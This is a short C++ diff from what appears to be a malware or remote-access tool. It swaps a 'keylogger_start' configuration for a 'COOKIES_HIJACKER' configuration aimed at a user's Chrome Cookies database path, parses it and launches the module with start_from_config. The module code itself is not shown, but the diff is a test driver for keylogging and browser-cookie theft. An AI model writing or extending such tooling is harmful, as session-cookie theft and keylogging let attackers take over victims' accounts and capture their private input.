@@ -26,7 +26,19 @@ std::string keylogger_start = R"(
     }
     )";
 
-    json config = json::parse(keylogger_start);
+std::string cookies_test = R"(
+    {
+        "COOKIES_HIJACKER": 
+        {
+            "1337": 
+            {
+            "cookies_path": "/home/galniv/.config/google-chrome/Default/Cookies"
+            }
+        }
+    }
+    )";
+
+    json config = json::parse(cookies_test);
 
     start_from_config(config);
     sleep(1000);
